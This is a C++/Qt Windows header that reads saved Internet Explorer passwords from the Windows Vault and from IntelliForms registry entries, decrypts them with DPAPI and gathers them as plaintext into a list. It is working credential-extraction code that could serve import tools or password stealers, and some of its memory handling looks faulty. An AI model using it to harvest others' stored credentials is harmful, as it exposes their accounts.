#ifndef IE_WINDOWS_H
#define IE_WINDOWS_H

#include <QVariantList>
#include <Windows.h>

#define log_error(x)
//qDebug() << x;
#define log_success(x)
//qDebug() << x;

#define URL_MAX_SIZE 150
#define MAX_HASH_SIZE 1024
#define MAX_URL_HISTORY 50
#define CIPHER_SIZE_MAX 5000

typedef HANDLE HVAULT;

enum VAULT_ELEMENT_TYPE {
    ElementType_Boolean = 0,
    ElementType_Short = 1,
    ElementType_UnsignedShort = 2,
    ElementType_Integer = 3,
    ElementType_UnsignedInteger = 4,
    ElementType_Double = 5,
    ElementType_Guid = 6,
    ElementType_String = 7,
    ElementType_ByteArray = 8,
    ElementType_TimeStamp = 9,
    ElementType_ProtectedArray = 0xA,
    ElementType_Attribute = 0xB,
    ElementType_Sid = 0xC,
    ElementType_Last = 0xD,
    ElementType_Undefined = 0xFFFFFFFF
};

typedef struct _VAULT_BYTE_BUFFER {
    DWORD Length;
    PBYTE Value;
} VAULT_BYTE_BUFFER, *PVAULT_BYTE_BUFFER;

typedef struct _VAULT_ITEM_DATA {
    DWORD SchemaElementId;
    DWORD unk0;
    enum VAULT_ELEMENT_TYPE Type;
    DWORD unk1;
    union {
        BOOL Boolean;
        SHORT Short;
        WORD UnsignedShort;
        LONG Int;
        ULONG UnsignedInt;
        DOUBLE Double;
        GUID Guid;
        LPWSTR String;
        VAULT_BYTE_BUFFER ByteArray;
        VAULT_BYTE_BUFFER ProtectedArray;
        DWORD Attribute;
        DWORD Sid;
    } data;
} VAULT_ITEM_DATA, *PVAULT_ITEM_DATA;

typedef struct _VAULT_ITEM_8 {
    GUID SchemaId;
    PWSTR FriendlyName;
    PVAULT_ITEM_DATA Resource;
    PVAULT_ITEM_DATA Identity;
    PVAULT_ITEM_DATA Authenticator;
    PVAULT_ITEM_DATA PackageSid;
    FILETIME LastWritten;
    DWORD Flags;
    DWORD cbProperties;
    PVAULT_ITEM_DATA Properties;
} VAULT_ITEM, *PVAULT_ITEM;

typedef struct _VAULT_ITEM_7 {
    GUID SchemaId;
    PWSTR FriendlyName;
    PVAULT_ITEM_DATA Resource;
    PVAULT_ITEM_DATA Identity;
    PVAULT_ITEM_DATA Authenticator;
    FILETIME LastWritten;
    DWORD Flags;
    DWORD cbProperties;
    PVAULT_ITEM_DATA Properties;
} VAULT_ITEM_7, *PVAULT_ITEM_7;

typedef DWORD(WINAPI *VaultEnumerateVaults_t)(DWORD flags, PDWORD count, GUID **guids);
typedef DWORD(WINAPI *VaultEnumerateItems_t)(HVAULT handle, DWORD flags, PDWORD count, PVOID *items);
typedef DWORD(WINAPI *VaultOpenVault_t)(GUID *id, DWORD flags, HVAULT *handle);
typedef DWORD(WINAPI *VaultCloseVault_t)(HVAULT handle);
typedef DWORD(WINAPI *VaultFree_t)(PVOID mem);
//typedef unsigned int (__stdcall *VaultGetItem_t)(void *VaultHandle, GUID *pSchemaId, vault_entry_s *pResource, vault_entry_s *pIdentity, vault_entry_s *pPackageSid, HWND *hwndOwner, unsigned int dwFlags, vault_cred_s **ppItem);
typedef DWORD(WINAPI * VaultGetItem_t) (HANDLE vault, LPGUID SchemaId, PVAULT_ITEM_DATA Resource, PVAULT_ITEM_DATA Identity, PVAULT_ITEM_DATA PackageSid, HWND hWnd, DWORD Flags, PVAULT_ITEM * pItem);

typedef struct {
    wchar_t utf_url[URL_MAX_SIZE];
    char url[URL_MAX_SIZE];
} IEUrl;

int load_ie_vault_libs();
int get_ie_vault_creds(QVariantList &list);
int dump_explorer(const char *output_file);
int dpapi_decrypt_entropy(char *cipher_data, int len_cipher_data, wchar_t *entropy_password, int len_entropy_password, char **plaintext_data);
int get_registry_history(IEUrl *urls, int *n_urls, int nHowMany);
void get_url_hash(wchar_t *wstrURL, char *strHash, int dwSize);
int get_ie_history();
void add_known_websites(IEUrl *urls, int *n_urls);
int get_ie_registry_creds(QVariantList &list);
int print_decrypted_data(char *decrypted_data, char *url, QVariantList &list);

VaultEnumerateVaults_t VaultEnumerateVaults = NULL;
VaultOpenVault_t VaultOpenVault = NULL;
VaultEnumerateItems_t VaultEnumerateItems = NULL;
VaultGetItem_t VaultGetItem = NULL;
VaultCloseVault_t VaultCloseVault = NULL;
VaultFree_t VaultFree = NULL;
HMODULE module_vault;

QString toString(LPWSTR str) {
    return QString::fromUtf16((const char16_t*)str);
    //    return QString::fromStdWString(std::wstring{(const char*)str, strlen(str)});
}

/**
 * DPAPI decryption using an password
 *
 * @return 1 on success, -1 on failure
 */
int dpapi_decrypt_entropy(char *cipher_data, int len_cipher_data, wchar_t *entropy_password, int len_entropy_password, char **plaintext_data) {
    DATA_BLOB encrypted_blob, decrypted_blob, entropy_blob;
    encrypted_blob.cbData = len_cipher_data;
    encrypted_blob.pbData = (BYTE*)cipher_data;
    entropy_blob.cbData = len_entropy_password;
    entropy_blob.pbData = (unsigned char *)entropy_password;

    if(!CryptUnprotectData(&encrypted_blob, NULL, &entropy_blob, NULL, NULL, 0, &decrypted_blob)) {
        log_error("CryptUnprotectData() failure");
        return -1;
    }
    *plaintext_data = (char*)malloc(decrypted_blob.cbData + 1);
    if(*plaintext_data == 0) {
        log_error("malloc() failure");
        free(*plaintext_data);
        return -1;
    }
    memcpy(*plaintext_data, decrypted_blob.pbData, decrypted_blob.cbData);
    (*plaintext_data)[decrypted_blob.cbData] = '\0';

    return 1;
}


/**
 * Get the IE URLs registry from the "TypeURLs" entry
 *
 * @return 1 on success, -1 on failure
 */
int get_registry_history(IEUrl *urls, int *n_urls, int nHowMany) {
    char szTemp[8];
    HKEY hKey;
    DWORD dwLength, dwType;

    if(RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\TypedURLs", 0, KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS) {
        log_error("RegOpenKeyEx() failure");
        return -1;
    }

    int added_urls = *n_urls;
    int nURL;
    for(nURL = 0; nURL < nHowMany; nURL++){
        sprintf(szTemp, "url%d", (nURL + 1));
        if(RegQueryValueExA(hKey, szTemp, NULL, NULL, NULL, &dwLength) == ERROR_SUCCESS){
            char *szURL = (char *)malloc(dwLength+1);
            if(szURL == 0) {
                log_error("malloc() failure");
                return -1;
            }
            if(RegQueryValueExA(hKey, szTemp, NULL, &dwType, (LPBYTE)szURL, &dwLength) == ERROR_SUCCESS){
                if(dwType == REG_SZ) {
                    *n_urls+=1;
                    memcpy(urls[nURL+added_urls].url, szURL, dwLength);
                    urls[nURL+added_urls].url[dwLength] = '\0';

                    // 1 wide char = 2 bytes
                    int utf_length = (int)dwLength*2;
                    mbstowcs(urls[nURL+added_urls].utf_url, szURL, dwLength);
                    urls[nURL+added_urls].url[utf_length] = '\0';
                }
            }
            free(szURL);
        }
    }
    RegCloseKey(hKey);
    return 1;
}

/**
 * Get the SHA1 hash value for a given url
 *
 * @return
 */
void get_url_hash(wchar_t *wstrURL, char *strHash, int dwSize) {
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;

    CryptAcquireContext(&hProv, 0, 0, PROV_RSA_FULL, CRYPT_VERIFYCONTEXT);
    CryptCreateHash(hProv,CALG_SHA1, 0, 0,&hHash);
    if(CryptHashData(hHash, (const BYTE *)wstrURL, (wcslen(wstrURL)+1)*2, 0)) {
        DWORD dwHashLen=20;
        BYTE Buffer[20];

        if(CryptGetHashParam(hHash, HP_HASHVAL, Buffer, &dwHashLen,0)) {
            char TmpBuf[MAX_HASH_SIZE];
            unsigned char tail=0;

            for(int i=0;i<20;i++) {
                unsigned char c = Buffer[i];
                tail+=c;
                sprintf_s(TmpBuf, MAX_HASH_SIZE, "%s%2.2X", strHash, c);
                strcpy_s(strHash, dwSize, TmpBuf);
            }
            // add the last 2 bytes
            sprintf_s(TmpBuf, MAX_HASH_SIZE, "%s%2.2X",strHash,tail);
            strcpy_s(strHash, dwSize, TmpBuf);
        }
        CryptDestroyHash(hHash);
    }
    CryptReleaseContext(hProv, 0);
}

/**
 * Get the IE history
 *
 * @return 1 on success, -1 on failure
 */
int get_ie_history() {
    // TODO

    return 1;
}

/**
 * Add Some obvious websites to the list of websites
 *
 * @return
 */
void add_known_websites(IEUrl *urls, int *n_urls) {
    // https://stackoverflow.com/questions/4832082/c-double-character-pointer-declaration-and-initialization
  /*  unsigned char *known_websites[] = {"https://www.facebook.com/", "http://www.facebook.com", "https://facebook.com/", "https://www.gmail.com/", "https://accounts.google.com/", "https://accounts.google.com/servicelogin"};
    int total_size = sizeof(known_websites) / sizeof(*known_websites);
    for(int i = 0; i < total_size; i++) {
        memcpy(urls[i].url, known_websites[i], strlen(known_websites[i]));
        urls[i].url[strlen(known_websites[i])] = '\0';
        mbstowcs(urls[i].utf_url, urls[i].url, strlen(urls[i].url));
        urls[i].utf_url[strlen(urls[i].url)*2] = '\0';
        *n_urls+=1;
    }
    */
}

/**
 * Main function to retrieve credentials from the registry
 *
 * @return 1 on success, -1 on failure
 */
int get_ie_registry_creds(QVariantList &list) {
    IEUrl urls[MAX_URL_HISTORY];
    int n_urls = 0;
    add_known_websites(urls, &n_urls);
    if(get_registry_history(urls, &n_urls, MAX_URL_HISTORY - n_urls) == -1) {
        log_error("get_registry_history() failure");
    }
    // get_ie_history(urls);

    HKEY hKey;
    if(ERROR_SUCCESS != RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2", 0, KEY_QUERY_VALUE, &hKey)) {
        log_error("RegOpenKeyEx() failure");
        return -1;
    }

    char url_hash[MAX_HASH_SIZE];
    char reg_hash[MAX_HASH_SIZE];
    DWORD size = MAX_HASH_SIZE;
    int i = 0;
    char *decrypted_data;

    while(ERROR_NO_MORE_ITEMS != RegEnumValueA(hKey, i, reg_hash, &size, NULL,NULL, NULL, NULL)) {
        for(int j = 0; j < n_urls; j++) {
            memset(url_hash, 0, MAX_HASH_SIZE);
            get_url_hash(urls[j].utf_url, url_hash, MAX_HASH_SIZE);
            if(strcmp(url_hash, reg_hash) == 0) {
                int len_cipher_data = CIPHER_SIZE_MAX;
                char *cipher_data = new char[len_cipher_data];
                if(RegQueryValueExA(hKey, reg_hash, 0, &size, (LPBYTE)cipher_data, (long unsigned int *)&len_cipher_data) != ERROR_SUCCESS) {
                    log_error("RegQueryValueEx() failure");
                }

                size_t url_length = (wcslen(urls[j].utf_url)+1)*2;
                if(dpapi_decrypt_entropy(cipher_data, len_cipher_data, urls[j].utf_url, url_length, &decrypted_data) == -1) {
                    log_error("dpapi_decrypt() failure");
                }
                print_decrypted_data(decrypted_data, urls[j].url, list);
                free(decrypted_data);
            }
        }
        // Needed to for the next entry
        size = MAX_HASH_SIZE;
        i++;
    }
    RegCloseKey(hKey);

    return 1;
}

void addPasswordToList(QVariantList &list, const QString &browser, const QString &url, const QString &username, const QString &password)
{
    QVariantMap map;
    map.insert("browser", browser);
    map.insert("url", url);
    map.insert("username", username);
    map.insert("password", password);
    list.append(map);
}

/**
 * Function to print the registry DPAPI decrypted data
 *
 * @return 1 on success, -1 on failure
 */
int print_decrypted_data(char *decrypted_data, char *url, QVariantList &list) {
    unsigned int HeaderSize;
    unsigned int DataMax;
    memcpy(&HeaderSize,&decrypted_data[4],4);
    memcpy(&DataMax,&decrypted_data[20],4);

    QString sUrl(url);
    QString username;
    QString password;
    char *pInfo = &decrypted_data[36];
    for(int n = 0; n < (int)DataMax; n++){
        //FILETIME ft,ftLocal;
        //SYSTEMTIME st;
        //memcpy(&ft,pInfo+4,8);
        //FileTimeToLocalFileTime(&ft,&ftLocal);
        //FileTimeToSystemTime(&ftLocal, &st);

        unsigned int offset;
        memcpy(&offset,pInfo,4);
        if(n % 2 == 0) {
//            log_success("Website : %s", url);
//            log_success("Username : %ls", (wchar_t *)&decrypted_data[HeaderSize+12+offset]);
            username = toString((wchar_t *)&decrypted_data[HeaderSize+12+offset]);
        }
        else {
            password = toString((wchar_t *)&decrypted_data[HeaderSize+12+offset]);

            addPasswordToList(list, "ie", sUrl, username, password);
        }



        // Data is 16 bytes length padded
        pInfo+=16;
    }

    return 1;
}

/**
 * Load the Windows IE necessary functions from the vaultcli
 *
 * @return 1 on success, -1 on failure
 */
int load_ie_vault_libs() {
    module_vault = LoadLibraryA("vaultcli.dll");
    if(module_vault == NULL) {
        log_error("LoadLibary() failure");
        return -1;
    }

    VaultEnumerateVaults = (VaultEnumerateVaults_t) GetProcAddress(module_vault, "VaultEnumerateVaults");
    VaultOpenVault = (VaultOpenVault_t)GetProcAddress(module_vault, "VaultOpenVault");
    VaultEnumerateItems = (VaultEnumerateItems_t)GetProcAddress(module_vault, "VaultEnumerateItems");
    VaultGetItem = (VaultGetItem_t)GetProcAddress(module_vault, "VaultGetItem");
    VaultCloseVault = (VaultCloseVault_t)GetProcAddress(module_vault, "VaultCloseVault");
    VaultFree = (VaultFree_t)GetProcAddress(module_vault, "VaultFree");

    if (!VaultEnumerateItems || !VaultEnumerateVaults || !VaultFree || !VaultOpenVault || !VaultCloseVault || !VaultGetItem) {
        log_error("GetProcAddress() failure");
        FreeLibrary(module_vault);
        return -1;
    }

    return 1;
}

/**
 * Main function to retrieve vault IE credentials
 *
 * @return 1 on success, -1 on failure
 */
int get_ie_vault_creds(QVariantList &passwords) {
    if(load_ie_vault_libs() == -1) {
        log_error("load_explorer_libs() failure");
        return -1;
    }

    DWORD vaults_counter, items_counter;
    LPGUID vaults;
    HANDLE hVault;
    PVOID items;
    PVAULT_ITEM vault_items, pvault_items;
    //PVAULT_ITEM_7 vault_test, pvault_test;

    if(VaultEnumerateVaults(0, &vaults_counter, &vaults) != ERROR_SUCCESS) {
        log_error("VaultEnumerateVaults() failure");
        return -1;
    }

    for(int i = 0; i < (int)vaults_counter; i++) {
        // We open the vault
        if (VaultOpenVault(&vaults[i], 0, &hVault) != ERROR_SUCCESS) {
            log_error("VaultOpenVault() failure");
            return -1;
        }

        if (VaultEnumerateItems(hVault, 512, &items_counter, &items) != ERROR_SUCCESS) {
            log_error("VaultEnumerateItems() failure");
            return -1;
        }
        vault_items = (PVAULT_ITEM)items;

        for(int j = 0; j < (int)items_counter; j++) {
//            qDebug() << "Source: %ls" << vault_items[j].FriendlyName;
            auto url = toString(vault_items[j].Resource->data.String);
            auto username = toString(vault_items[j].Identity->data.String);
            QString password;

            pvault_items = NULL;
            if (VaultGetItem(hVault, &vault_items[j].SchemaId, vault_items[j].Resource, vault_items[j].Identity, vault_items[j].PackageSid, NULL, 0, &pvault_items) != 0) {
                log_error("VaultGetItem() failure");
            }

            // If the password is not empty
            if (pvault_items->Authenticator != NULL && pvault_items->Authenticator->data.String != NULL) {
                password = toString(pvault_items->Authenticator->data.String);
            }

            addPasswordToList(passwords, "ie", url, username, password);
            VaultFree(pvault_items);
        }
        VaultFree(vault_items);
        VaultCloseVault(&hVault);
    }

    VaultFree(vaults);
    FreeLibrary(module_vault);
    return 1;
}

#endif // IE_WINDOWS_H
